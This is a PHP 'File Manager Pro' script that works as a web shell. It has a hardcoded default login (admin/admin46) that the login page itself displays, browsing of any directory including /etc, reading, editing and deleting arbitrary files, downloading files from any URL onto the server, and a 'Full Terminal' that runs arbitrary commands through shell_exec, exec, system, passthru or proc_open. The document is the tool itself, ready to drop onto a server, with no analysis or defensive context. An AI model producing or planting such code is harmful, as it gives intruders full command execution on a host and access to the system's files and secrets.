<?php
/********************************************************************
 *  File Manager with Full Terminal + URL Upload + Quick Jump
 ********************************************************************/

session_start();
error_reporting(E_ALL);

/* ----------------- LOGIN ----------------- */
$USER = "admin";
$PASS = password_hash("admin46", PASSWORD_DEFAULT);

if (!isset($_SESSION['ok'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
        if ($_POST['u'] === $USER && password_verify($_POST['p'], $PASS)) {
            $_SESSION['ok'] = 1;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_err = "Invalid username or password.";
        }
    }
    echo '<!doctype html><html><head><meta charset="utf-8"><title>Login</title>
    <style>
      body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#07070b;color:#e6eef8;font-family:Inter,Segoe UI,Arial;}
      .box{width:360px;padding:28px;border-radius:14px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.18));box-shadow:0 10px 40px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.03);}
      h1{margin:0 0 14px 0;font-size:20px;color:#7be3ff;text-align:center;letter-spacing:0.6px}
      label{font-size:12px;color:#9fb8c9}
      input{width:100%;padding:12px;margin-top:8px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8}
      .btn{width:100%;padding:12px;margin-top:14px;border-radius:10px;border:none;background:linear-gradient(90deg,#8affff,#6b6bff);color:#071028;font-weight:700;cursor:pointer;box-shadow:0 6px 24px rgba(107,107,255,0.14)}
      .err{margin-top:10px;color:#ff8080;text-align:center;font-size:13px}
      .hint{margin-top:8px;font-size:12px;color:#7b9bb0;text-align:center}
    </style></head><body>
    <div class="box">
      <h1>FILE MANAGER</h1>
      <form method="POST">
        <label>Username</label>
        <input name="u" required autofocus>
        <label>Password</label>
        <input type="password" name="p" required>
        <button class="btn">Unlock</button>
      </form>';
    if (!empty($login_err)) echo '<div class="err">'.htmlspecialchars($login_err).'</div>';
    echo '<div class="hint">Default: <b>admin</b> / <b>admin46</b></div></div></body></html>';
    exit;
}

/* ----------------- PATH (ALLOW ALL DIRECTORIES) ----------------- */
// Default to current directory, but allow any directory access
$dir = $_GET['dir'] ?? __DIR__;
if (!is_dir($dir)) {
    $dir = __DIR__;
}
$ROOT = $dir;

/* ----------------- HELPERS ----------------- */
function hfs($bytes){
    $u=["B","KB","MB","GB","TB"];
    $i=0;
    while($bytes>=1024 && $i < count($u)-1){ $bytes/=1024; $i++; }
    return round($bytes,2).' '.$u[$i];
}
function esc($s){ return htmlspecialchars($s, ENT_QUOTES); }

/* ----------------- ACTIONS ----------------- */

// Upload from URL
if (isset($_POST['url_upload']) && trim($_POST['url_upload']) !== '') {
    $url = trim($_POST['url_upload']);
    $filename = basename(parse_url($url, PHP_URL_PATH));
    
    if (empty($filename) || $filename === '/') {
        $filename = 'downloaded_' . time();
    }
    
    $savePath = $dir . DIRECTORY_SEPARATOR . $filename;
    
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 30,
            'user_agent' => 'Mozilla/5.0'
        ]
    ]);
    
    $data = @file_get_contents($url, false, $ctx);
    
    if ($data !== false) {
        @file_put_contents($savePath, $data);
    }
    
    header("Location:?dir=" . urlencode($dir)); 
    exit;
}

// Create folder
if (isset($_POST['new_folder']) && trim($_POST['new_folder'])!=='') {
    @mkdir($dir . DIRECTORY_SEPARATOR . basename($_POST['new_folder']), 0755, true);
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Create file
if (isset($_POST['new_file']) && trim($_POST['new_file'])!=='') {
    @file_put_contents($dir . DIRECTORY_SEPARATOR . basename($_POST['new_file']), "");
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Upload files
if (!empty($_FILES['upload']['name'][0])) {
    foreach ($_FILES['upload']['tmp_name'] as $k => $tmp) {
        $name = basename($_FILES['upload']['name'][$k]);
        @move_uploaded_file($tmp, $dir . DIRECTORY_SEPARATOR . $name);
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Delete file
if (isset($_POST['del_file'])) {
    $p = $_POST['del_file'];
    if (is_file($p)) {
        @unlink($p);
    } elseif (is_dir($p)) {
        @rmdir($p);
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// View / Edit
$file_content = '';
$edit_file_path = '';
if (isset($_POST['view_file'])) {
    $p = $_POST['view_file'];
    if (is_file($p)) {
        $file_content = file_get_contents($p);
        $edit_file_path = $p;
    }
}

if (isset($_POST['save_file'])) {
    $p = $_POST['save_file_path'];
    @file_put_contents($p, $_POST['file_content']);
    header("Location:?dir=" . urlencode(dirname($p))); exit;
}

// ZIP current folder
if (isset($_POST['zip_folder'])) {
    $zipname = $dir . DIRECTORY_SEPARATOR . "archive_" . time() . ".zip";
    $zip = new ZipArchive;
    if ($zip->open($zipname, ZipArchive::CREATE)) {
        foreach (scandir($dir) as $f) {
            if ($f == '.' || $f == '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $f;
            if (is_file($path)) $zip->addFile($path, $f);
        }
        $zip->close();
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// UNZIP
if (isset($_POST['unzip_file'])) {
    $p = $_POST['unzip_file'];
    if (is_file($p)) {
        $zip = new ZipArchive;
        if ($zip->open($p)) {
            $zip->extractTo($dir);
            $zip->close();
        }
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// =============================================================================
// FULL TERMINAL - EXECUTE ALL COMMANDS
// =============================================================================

function run_terminal_full($cmd, $workdir) {
    $cmd = trim($cmd);
    if (empty($cmd)) return '';
    
    // Change to working directory
    $original_dir = getcwd();
    chdir($workdir);
    
    $output = '';
    
    // Try multiple execution methods
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        $output_array = [];
        exec($cmd . ' 2>&1', $output_array);
        $output = implode("\n", $output_array);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('proc_open')) {
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        
        $process = proc_open($cmd, $descriptorspec, $pipes, $workdir);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            
            $output .= $errors;
        }
    } else {
        $output = "Error: No execution functions available";
    }
    
    // Return to original directory
    chdir($original_dir);
    
    return $output ?: "Command executed (no output)";
}

$terminal_output = '';
if (isset($_POST['terminal_cmd'])) {
    $terminal_output = run_terminal_full($_POST['terminal_cmd'], $dir);
}

/* ----------------- HTML UI (DARK CYBERPUNK) ----------------- */
?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager Pro</title>
<style>
:root{
  --bg:#07070b;
  --panel:#0f1220;
  --muted:#90a3b8;
  --neon-cyan:#6df0ff;
  --neon-mag:#b46cff;
  --accent:#6df0ff;
  --glass: rgba(255,255,255,0.03);
}
*{box-sizing:border-box}
body{margin:0;font-family:Inter,Segoe UI,Arial;background:
radial-gradient(1200px 600px at 10% 10%, rgba(124,58,237,0.06), transparent 6%),
radial-gradient(1000px 500px at 90% 90%, rgba(35,211,243,0.03), transparent 6%),
var(--bg);color:#e6eef8;min-height:100vh}
.container{max-width:1300px;margin:28px auto;padding:18px}
.header{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px;flex-wrap:wrap}
.brand{display:flex;align-items:center;gap:12px}
.logo{width:48px;height:48px;border-radius:10px;background:linear-gradient(135deg,#0ff,#a0f);display:flex;align-items:center;justify-content:center;color:#071028;font-weight:900;font-family:monospace}
.title{font-size:20px;font-weight:700;letter-spacing:0.6px;color:var(--neon-cyan)}
.controls{display:flex;gap:10px;align-items:center;flex-wrap:wrap}

/* Quick Jump Bar */
.jump-bar{display:flex;gap:8px;align-items:center;margin-bottom:14px;padding:12px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.25));border-radius:10px;border:1px solid rgba(255,255,255,0.03);flex-wrap:wrap}
.jump-btn{padding:8px 12px;border-radius:8px;border:none;background:linear-gradient(90deg,#2b0b3a,#061023);color:var(--neon-cyan);cursor:pointer;font-weight:600;font-size:13px}
.jump-btn:hover{background:linear-gradient(90deg,#3b1b4a,#071033)}

/* top cards */
.top-row{display:grid;grid-template-columns: 1fr 450px;gap:14px;margin-bottom:14px}
.card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.25));border-radius:12px;padding:14px;border:1px solid rgba(255,255,255,0.03);box-shadow: 0 8px 30px rgba(15,20,30,0.5)}
.card h3{margin:0 0 8px 0;color:var(--neon-mag);font-size:15px}
.small{color:var(--muted);font-size:13px}

/* actions grid */
.actions{display:flex;gap:10px;flex-wrap:wrap}
.action-btn{display:inline-flex;align-items:center;gap:10px;padding:10px 14px;border-radius:10px;border:none;background:linear-gradient(90deg,#2b0b3a,#061023);color:var(--neon-cyan);cursor:pointer;font-weight:700;box-shadow:0 8px 30px rgba(75,0,130,0.12);font-size:13px}
.action-btn:hover{transform:translateY(-4px);box-shadow:0 10px 40px rgba(75,0,130,0.18)}
.action-btn .ico{font-size:18px;filter:drop-shadow(0 2px 8px rgba(107,107,255,0.18))}

/* forms */
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
.input, input[type="file"], select{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8;font-size:13px}
.input::placeholder{color:var(--muted)}
.btn-neon{background:linear-gradient(90deg,var(--neon-cyan),#7a6bff);border-radius:10px;padding:10px 14px;border:none;color:#071028;font-weight:800;cursor:pointer;box-shadow:0 14px 40px rgba(109,240,255,0.06)}
.btn-danger{background:linear-gradient(90deg,#ff5f7a,#ff9fb4);color:#071028}

/* file table */
.table-wrap{overflow:auto;border-radius:10px}
table{width:100%;border-collapse:collapse;min-width:720px}
th,td{padding:12px 14px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03)}
th{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.06));color:var(--muted);font-size:13px}
tr:hover td{background:linear-gradient(90deg, rgba(109,240,255,0.02), rgba(180,108,255,0.01))}
.filename{font-weight:700;color:#ffffff}
.filetype{font-size:13px;color:var(--muted)}
.kv{font-size:13px;color:var(--muted)}

/* right column: terminal & uploader stacked */
.right-col{display:flex;flex-direction:column;gap:12px}
.uploader{display:flex;flex-direction:column;gap:8px}
.uploader input[type=file]{padding:8px;background:transparent;border:1px dashed rgba(255,255,255,0.04);border-radius:8px;color:var(--muted)}
.upload-actions{display:flex;gap:8px}

/* editor card */
.editor{min-height:160px;padding:12px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.12));border:1px solid rgba(255,255,255,0.03)}
.editor textarea{width:100%;height:220px;background:transparent;border:none;color:#e6eef8;font-family:Consolas,monospace;resize:vertical;outline:none}

/* terminal */
.terminal{background:#040408;border-radius:10px;padding:12px;color:#aee7ff;height:280px;overflow:auto;font-family:monospace;border:1px solid rgba(109,240,255,0.06);white-space:pre-wrap;font-size:13px}
.terminal .prompt{color:#6df0ff}
.terminal-input{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);background:#071026;color:#cdefff;margin-top:8px;font-family:monospace}

/* responsiveness */
@media(max-width:980px){
  .top-row{grid-template-columns:1fr}
  .form-grid{grid-template-columns:1fr}
  .right-col{order:2}
  .table-wrap{order:1;margin-top:12px}
}
</style>
</head>
<body>
<div class="container">

  <div class="header">
    <div class="brand">
      <div class="logo">FM</div>
      <div>
        <div class="title">File Manager Pro</div>
      </div>
    </div>

    <div class="controls">
      <form method="GET" style="display:flex;gap:8px">
        <input type="text" name="dir" placeholder="Jump to path..." class="input" style="width:380px" value="<?=esc($dir)?>">
        <button class="action-btn" style="padding:10px 16px">üöÄ GO</button>
      </form>
    </div>
  </div>

  <!-- Quick Jump Bar -->
  <div class="jump-bar">
    <strong style="color:var(--neon-mag);font-size:13px">Quick Jump:</strong>
    <a href="?dir=/" style="text-decoration:none"><button class="jump-btn">üìÅ /</button></a>
    <a href="?dir=/home" style="text-decoration:none"><button class="jump-btn">üè† /home</button></a>
    <a href="?dir=/var/www" style="text-decoration:none"><button class="jump-btn">üåê /var/www</button></a>
    <a href="?dir=/tmp" style="text-decoration:none"><button class="jump-btn">üì¶ /tmp</button></a>
    <a href="?dir=/etc" style="text-decoration:none"><button class="jump-btn">‚öôÔ∏è /etc</button></a>
    <a href="?dir=<?=esc(__DIR__)?>" style="text-decoration:none"><button class="jump-btn">üìÇ Script Dir</button></a>
    <?php if (dirname($dir) !== $dir): ?>
    <a href="?dir=<?=urlencode(dirname($dir))?>" style="text-decoration:none"><button class="jump-btn">‚¨ÜÔ∏è Parent</button></a>
    <?php endif; ?>
  </div>

  <div class="top-row">
    <!-- LEFT: file list -->
    <div class="card">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
        <h3>üìÇ <?=esc(basename($dir) ?: $dir)?></h3>
        <div class="small"><?=esc($dir)?></div>
      </div>

      <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px;flex-wrap:wrap">
        <form method="POST" style="margin:0">
          <button class="action-btn" name="zip_folder" title="Zip current folder"><span class="ico">üì¶</span> ZIP</button>
        </form>

        <form method="POST" enctype="multipart/form-data" style="margin:0;display:flex;gap:6px">
          <label style="display:inline-flex;gap:8px;align-items:center">
            <input type="file" name="upload[]" multiple style="display:none" id="filepick">
            <button type="button" class="action-btn" onclick="document.getElementById('filepick').click()"><span class="ico">‚¨ÜÔ∏è</span> SELECT</button>
          </label>
          <button class="action-btn btn-neon" type="submit">UPLOAD</button>
        </form>
      </div>

      <div class="form-grid">
        <form method="POST" style="display:flex;gap:8px">
          <input class="input" name="new_folder" placeholder="New folder name">
          <button class="btn-neon" type="submit">üìÅ Folder</button>
        </form>

        <form method="POST" style="display:flex;gap:8px">
          <input class="input" name="new_file" placeholder="New file (ex: test.txt)">
          <button class="btn-neon" type="submit">üìÑ File</button>
        </form>
      </div>

      <div class="table-wrap" style="margin-top:12px">
        <table>
          <thead>
            <tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr>
          </thead>
          <tbody>
            <?php 
            $files = @scandir($dir);
            if ($files === false) $files = [];
            foreach ($files as $f): 
                if ($f=='.' || $f=='..') continue; 
                $p = $dir . DIRECTORY_SEPARATOR . $f; 
            ?>
            <tr>
              <td class="filename"><?=esc($f)?></td>
              <td class="filetype"><?=is_dir($p) ? 'üìÅ Folder' : 'üìÑ File'?></td>
              <td class="kv"><?=is_file($p) ? hfs(@filesize($p)) : '-'?></td>
              <td style="white-space:nowrap">
                <?php if (is_dir($p)): ?>
                  <a href="?dir=<?=urlencode($p)?>" style="text-decoration:none"><button class="action-btn" type="button">üìÇ Open</button></a>
                <?php else: ?>
                  <a href="<?=esc($p)?>" download style="text-decoration:none"><button class="action-btn" type="button">‚¨á DL</button></a>
                  <form method="POST" style="display:inline">
                    <input type="hidden" name="view_file" value="<?=esc($p)?>" />
                    <button class="action-btn" style="margin-left:6px">‚úèÔ∏è Edit</button>
                  </form>
                  <form method="POST" style="display:inline">
                    <input type="hidden" name="del_file" value="<?=esc($p)?>" />
                    <button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete?')">üóë</button>
                  </form>
                  <?php if (pathinfo($p, PATHINFO_EXTENSION) === 'zip'): ?>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="unzip_file" value="<?=esc($p)?>" />
                      <button class="action-btn" style="margin-left:6px">üìÇ Unzip</button>
                    </form>
                  <?php endif; ?>
                <?php endif; ?>
              </td>
            </tr>
            <?php endforeach; ?>
          </tbody>
        </table>
      </div>
    </div>

    <!-- RIGHT: uploader + terminal -->
    <div class="right-col">
      <div class="card uploader">
        <h3>‚¨ÜÔ∏è Upload</h3>
        
        <!-- Upload from URL -->
        <div style="margin-bottom:12px">
          <form method="POST" style="display:flex;gap:8px">
            <input class="input" name="url_upload" placeholder="https://example.com/file.zip" style="flex:1">
            <button class="btn-neon" type="submit">üåê From URL</button>
          </form>
        </div>

        <!-- Upload from Computer -->
        <form method="POST" enctype="multipart/form-data" style="display:flex;flex-direction:column;gap:8px">
          <input type="file" name="upload[]" multiple>
          <button class="btn-neon" type="submit">üíæ Upload Files</button>
        </form>

        <hr style="border:none;border-top:1px solid rgba(255,255,255,0.05);margin:12px 0">

        <div>
          <form method="POST" style="display:flex;gap:8px;margin-bottom:8px">
            <input class="input" name="new_folder" placeholder="New folder">
            <button class="btn-neon" type="submit">üìÅ</button>
          </form>
          <form method="POST" style="display:flex;gap:8px">
            <input class="input" name="new_file" placeholder="New file">
            <button class="btn-neon" type="submit">üìÑ</button>
          </form>
        </div>
      </div>

      <div class="card">
        <h3>üíª Terminal <span style="color:#ff6b6b;font-size:11px">(Full Access)</span></h3>
        <div class="terminal" id="termOutput"><?=esc($terminal_output)?></div>
        <form method="POST" style="margin-top:8px">
          <input class="terminal-input" name="terminal_cmd" placeholder="$ Enter command..." autocomplete="off">
        </form>
      </div>
    </div>
  </div>

  <!-- Editor modal-ish area -->
  <?php if ($file_content !== ''): ?>
  <div class="card editor" id="editorCard">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <div><strong>‚úèÔ∏è Editing:</strong> <?=esc(basename($edit_file_path))?></div>
      <div class="small"><?=esc(dirname($edit_file_path))?></div>
    </div>
    <form method="POST" style="margin-top:10px">
      <textarea name="file_content"><?=esc($file_content)?></textarea>
      <input type="hidden" name="save_file_path" value="<?=esc($edit_file_path)?>">
      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:10px">
        <button class="btn-neon" name="save_file" type="submit">üíæ Save File</button>
        <a href="?dir=<?=urlencode(dirname($edit_file_path))?>" style="text-decoration:none"><button type="button" class="action-btn" style="background:linear-gradient(90deg,#222,#061023);color:var(--neon-cyan)">‚Üê Back</button></a>
      </div>
    </form>
  </div>
  <?php endif; ?>

</div>

<script>
// Auto-scroll terminal to bottom
(function(){
  var term = document.getElementById('termOutput');
  if(term) term.scrollTop = term.scrollHeight;
})();
</script>
</body>
</html>